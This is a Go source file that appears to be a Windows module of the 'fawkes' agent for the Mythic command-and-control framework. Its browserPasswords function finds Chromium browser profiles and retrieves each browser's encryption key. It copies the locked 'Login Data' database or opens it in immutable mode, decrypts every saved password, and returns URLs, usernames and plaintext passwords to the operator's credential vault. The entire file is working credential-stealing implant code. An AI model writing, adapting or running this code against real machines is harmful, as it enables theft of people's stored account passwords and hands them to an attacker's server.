//go:build windows

package commands

import (
	"database/sql"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

func browserPasswords(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine LOCALAPPDATA path")
	}

	var allCreds []browserCred
	var errors []string

	for browserName, userDataDir := range paths {
		func() {
			// Check if browser is installed
			if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
				return
			}

			// Get the encryption key
			key, err := getEncryptionKey(userDataDir)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
				return
			}
			defer structs.ZeroBytes(key)

			// Find all profiles
			profiles := findProfiles(userDataDir)
			if len(profiles) == 0 {
				errors = append(errors, fmt.Sprintf("%s: no profiles with Login Data found", browserName))
				return
			}

			for _, profileDir := range profiles {
				loginDataPath := filepath.Join(profileDir, "Login Data")
				profileName := filepath.Base(profileDir)

				// Strategy 1: Copy DB to temp file, open from copy
				tf, tfErr := os.CreateTemp("", "")
				if tfErr == nil {
					tmpFile := tf.Name()
					tf.Close()
					if copyErr := copyFile(loginDataPath, tmpFile); copyErr == nil {
						creds, readErr := readLoginData(tmpFile, key, browserName, profileName)
						secureRemove(tmpFile)
						if readErr == nil {
							allCreds = append(allCreds, creds...)
							continue
						}
						errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, readErr))
						continue
					}
					secureRemove(tmpFile)
				}

				// Strategy 2: Open locked DB directly in immutable mode
				immutableURI := "file:///" + filepath.ToSlash(loginDataPath) + "?immutable=1"
				creds, err := readLoginData(immutableURI, key, browserName, profileName)
				if err != nil {
					errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
					continue
				}
				allCreds = append(allCreds, creds...)
			}
		}()
	}

	// Format output
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Credentials (%d found) ===\n\n", len(allCreds)))

	for _, cred := range allCreds {
		sb.WriteString(fmt.Sprintf("Browser:  %s\n", cred.Browser))
		sb.WriteString(fmt.Sprintf("URL:      %s\n", cred.URL))
		sb.WriteString(fmt.Sprintf("Username: %s\n", cred.Username))
		if cred.Password != "" {
			sb.WriteString(fmt.Sprintf("Password: %s\n", cred.Password))
		} else {
			sb.WriteString("Password: [decryption failed]\n")
		}
		sb.WriteString("\n")
	}

	if len(errors) > 0 {
		sb.WriteString("--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	if len(allCreds) == 0 && len(errors) == 0 {
		sb.WriteString("No Chromium-based browsers found or no saved credentials.\n")
	}

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}

	// Report decrypted passwords to Mythic credential vault
	var mythicCreds []structs.MythicCredential
	for _, cred := range allCreds {
		if cred.Password != "" && cred.Username != "" {
			mythicCreds = append(mythicCreds, structs.MythicCredential{
				CredentialType: "plaintext",
				Realm:          cred.URL,
				Account:        cred.Username,
				Credential:     cred.Password,
				Comment:        fmt.Sprintf("browser (%s)", cred.Browser),
			})
		}
	}
	if len(mythicCreds) > 0 {
		result.Credentials = &mythicCreds
	}

	// Zero decrypted passwords from local credential cache
	for i := range allCreds {
		structs.ZeroString(&allCreds[i].Password)
	}

	return result
}

func readLoginData(dbPath string, key []byte, browserName, profileName string) ([]browserCred, error) {
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, fmt.Errorf("open database: %w", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL AND length(password_value) > 0")
	if err != nil {
		return nil, fmt.Errorf("query logins: %w", err)
	}
	defer rows.Close()

	var creds []browserCred
	label := browserName
	if profileName != "Default" {
		label = fmt.Sprintf("%s (%s)", browserName, profileName)
	}

	for rows.Next() {
		var url, username string
		var passwordBlob []byte

		if err := rows.Scan(&url, &username, &passwordBlob); err != nil {
			continue
		}

		if len(passwordBlob) == 0 {
			continue
		}

		password, err := decryptPassword(passwordBlob, key)
		if err != nil {
			password = ""
		}

		// Skip entries with no username and no password
		if username == "" && password == "" {
			continue
		}

		creds = append(creds, browserCred{
			Browser:  label,
			URL:      url,
			Username: username,
			Password: password,
		})
	}
	if err := rows.Err(); err != nil {
		return creds, fmt.Errorf("row iteration error: %v", err)
	}

	return creds, nil
}
